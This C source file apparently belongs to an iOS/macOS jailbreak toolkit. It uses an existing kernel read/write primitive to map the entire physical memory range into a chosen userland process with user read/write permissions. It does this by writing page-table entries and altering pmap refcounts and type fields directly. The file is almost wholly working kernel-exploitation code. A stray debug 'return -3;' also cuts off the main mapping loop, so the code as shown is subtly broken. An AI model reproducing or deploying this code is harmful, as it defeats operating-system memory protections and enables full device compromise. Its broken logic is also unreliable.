#include "handoff.h"
#include "kextrw.h"
#include "kutils.h"
#include "offsets.h"
#include "translation.h"
#include "physrw.h"
#include "kfunc.h"
#include "pvh.h"
#include "pte.h"
#include <errno.h>

int physrw_handoff(pid_t pid)
{
	if (!pid) return -1;

	uint64_t proc = proc_of_pid(pid);
	if (!proc) return -2;

	int ret = 0;
	do {
        uint64_t proc = proc_of_pid(pid);
        uint64_t p_proc_ro = kread64(proc + off_p_proc_ro);
        uint64_t pr_task = kread64(p_proc_ro + off_p_ro_pr_task);
        printf("[*] pr_task = 0x%llx\n", pr_task);
        
		if (!pr_task) { ret = -3; break; };

		uint64_t vmMap = kreadptr(pr_task + off_task_map);
        printf("[*] vmMap = 0x%llx\n", vmMap);
		if (!vmMap) { ret = -4; break; };

		uint64_t pmap = kreadptr(vmMap + off_vm_map_pmap);
        printf("[*] pmap = 0x%llx\n", pmap);
		if (!pmap) { ret = -5; break; };

        uint64_t gPhysBase = kread64(ksym(KSYMBOL_gPhysBase));
        uint64_t gPhysSize = kread64(ksym(KSYMBOL_gPhysSize));
        printf("[*] PPLRW_USER_MAPPING_OFFSET = 0x%llx, gPhysBase = 0x%llx, gPhysSize = 0x%llx\n", PPLRW_USER_MAPPING_OFFSET, gPhysBase, gPhysSize);

		// Map the entire kernel physical address space into the userland process, starting at PPLRW_USER_MAPPING_OFFSET
		int mapInRet = pmap_map_in(pmap, gPhysBase+PPLRW_USER_MAPPING_OFFSET, gPhysBase, gPhysSize);
		if (mapInRet != 0) ret = -10 + mapInRet;
	} while (0);

	return ret;
}

int pmap_map_in(uint64_t pmap, uint64_t uaStart, uint64_t paStart, uint64_t size)
{
	uint64_t ttep = kread64(pmap + off_pmap_ttep);
    printf("[*] ttep = 0x%llx\n", ttep);

	uint64_t paEnd = paStart + size;
	uint64_t uaEnd = uaStart + size;

	uint64_t uaL2Start = uaStart & ~L2_BLOCK_MASK;
	uint64_t uaL2End   = ((uaStart + size - 1) + L2_BLOCK_SIZE) & ~L2_BLOCK_MASK;

	uint64_t paL2Start = paStart & ~L2_BLOCK_MASK;
	uint64_t l2Count = (((uaL2End - uaL2Start) - 1) / L2_BLOCK_SIZE) + 1;

	// Sanity check: Ensure the entire area to be mapped in is not mapped to anything yet
	for(uint64_t ua = uaStart; ua < uaEnd; ua += vm_real_kernel_page_size) {
		uint64_t leafLevel = PMAP_TT_L3_LEVEL;
		if (vtophys_lvl(ttep, ua, &leafLevel, NULL) != 0) {
			return -1;
		}
		else {
			// Performance improvement
			// If there is no L1 / L2 mapping we can skip a whole bunch of addresses
			if (leafLevel == PMAP_TT_L1_LEVEL) {
				ua = (((ua + L1_BLOCK_SIZE) & ~L1_BLOCK_MASK) - vm_real_kernel_page_size);
			}
			else if (leafLevel == PMAP_TT_L2_LEVEL) {
				ua = (((ua + L2_BLOCK_SIZE) & ~L2_BLOCK_MASK) - vm_real_kernel_page_size);
			}
		}

		if (vtophys(ttep, ua)) return -1;
		// TODO: If all mappings match 1:1, maybe return 0 instead of -1?
	}
	// Allocate all page tables that need to be allocated
	if (pmap_expand_range(pmap, uaStart, size) != 0) return -1;
	
	// Insert entries into L3 pages
	for (uint64_t i = 0; i < l2Count; i++) {
		uint64_t uaL2Cur = uaL2Start + (i * L2_BLOCK_SIZE);
		uint64_t paL2Cur = paL2Start + (i * L2_BLOCK_SIZE);

		// Create full table for this mapping
		uint64_t tableToWrite[L2_BLOCK_COUNT];
		for (int k = 0; k < L2_BLOCK_COUNT; k++) {
			uint64_t curMappingPage = paL2Cur + (k * vm_real_kernel_page_size);
			if (curMappingPage >= paStart && curMappingPage < paEnd) {
				tableToWrite[k] = curMappingPage | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY;
			}
			else {
				tableToWrite[k] = 0;
			}
		}

		// Replace table with the entries we generated
		uint64_t leafLevel = PMAP_TT_L2_LEVEL;
		printf("leafLevel: 0x%llx, uaL2Cur: 0x%llx, ttep: 0x%llx, errno = %d\n", leafLevel, uaL2Cur, ttep, errno);
		uint64_t level2Table = vtophys_lvl(ttep, uaL2Cur, &leafLevel, NULL);
        printf("level2Table: 0x%llx, uaL2Cur: 0x%llx, ttep: 0x%llx, errno = %d\n", level2Table, uaL2Cur, ttep, errno);
		return -3;
		if (!level2Table) return -2;
		physwritebuf_via_krw(level2Table, tableToWrite, vm_real_kernel_page_size);

        // Reference count of new page table must be 0!
	    // original ref count is 1 because the table holds one PTE
	    // Our new PTEs are not part of the pmap layer though so refcount needs to be 0
        uint64_t pvh = pai_to_pvh(pa_index(level2Table));
		uint64_t ptdp = pvh_ptd(pvh);
        printf("ptdp = 0x%llx, off_pt_desc_ptd_info = 0x%x\n", ptdp, off_pt_desc_ptd_info);

		uint16_t pinfo_refCount = kread16(ptdp + off_pt_desc_ptd_info);
        printf("pinfo_refCount = 0x%hx\n", pinfo_refCount);

        kwrite16(ptdp + off_pt_desc_ptd_info, 0);
	}

	return 0;
}

int pmap_expand_range(uint64_t pmap, uint64_t vaStart, uint64_t size)
{
	uint64_t ttep = kread64(pmap + off_pmap_ttep);

    uint64_t unmappedStart = 0, unmappedSize = 0;

	uint64_t l2Start = vaStart & ~L2_BLOCK_MASK;
	uint64_t l2End = (vaStart + (size - 1)) & ~L2_BLOCK_MASK;
	uint64_t l2Count = ((l2End - l2Start) / L2_BLOCK_SIZE) + 1;

	for (uint64_t i = 0; i <= l2Count; i++) {
		uint64_t curL2 = l2Start + (i * L2_BLOCK_SIZE);

		uint64_t leafLevel = PMAP_TT_L3_LEVEL;
		uint64_t pt3 = 0;
		vtophys_lvl(ttep, curL2, &leafLevel, &pt3);
		if (leafLevel == PMAP_TT_L3_LEVEL || i == l2Count) {
			// i == l2Count: one extra cycle that this for loop takes
			// We hit this block either if there was a mapping or at the end
			// Alloc page tables for the current area (unmappedStart, unmappedSize) by running pmap_enter_options on every page
			// And then running pmap_remove on the entire area while nested is true
			for (uint64_t l2Off = 0; l2Off < unmappedSize; l2Off += L2_BLOCK_SIZE) {
				kern_return_t kr = kfunc_pmap_enter_options_addr(pmap, FAKE_PHYSPAGE_TO_MAP, unmappedStart + l2Off);
				if (kr != KERN_SUCCESS) {
					return -7;
				}
			}

			// Set type to nested
			physwrite8_via_krw(kvtophys(pmap + off_pmap_type), 3);

			// Remove mapping (table will stay cause nested is set)
			pmap_remove(pmap, unmappedStart, unmappedStart + unmappedSize);

			// Change type back
			physwrite8_via_krw(kvtophys(pmap + off_pmap_type), 0);
			
			unmappedStart = 0;
			unmappedSize = 0;
			continue;
		}
		else {
			if (unmappedStart == 0) { 
				unmappedStart = curL2;
			}
			unmappedSize += L2_BLOCK_SIZE;
		}
	}

    return 0;
}

void pmap_remove(uint64_t pmap, uint64_t start, uint64_t end)
{
    uint64_t remove_count = 0;
    if (!pmap) {
        return;
    }
    uint64_t va = start;
    while (va < end) {
        uint64_t l;
        l = ((va + L2_BLOCK_SIZE) & ~L2_BLOCK_MASK);
        if (l > end) {
            l = end;
        }
        remove_count = kfunc_pmap_remove_options(pmap, va, l);
        va = remove_count;
    }
}

#define atop(x) ((vm_address_t)(x) >> vm_kernel_page_shift)
uint64_t pa_index(uint64_t pa)
{
	return atop(pa - kread64(ksym(KSYMBOL_vm_first_phys)));
}

uint64_t pai_to_pvh(uint64_t pai)
{
	return kread64(ksym(KSYMBOL_pv_head_table)) + (pai * 8);
}

uint64_t pvh_ptd(uint64_t pvh)
{
	return ((kread64(pvh) & PVH_LIST_MASK) | PVH_HIGH_FLAGS);
}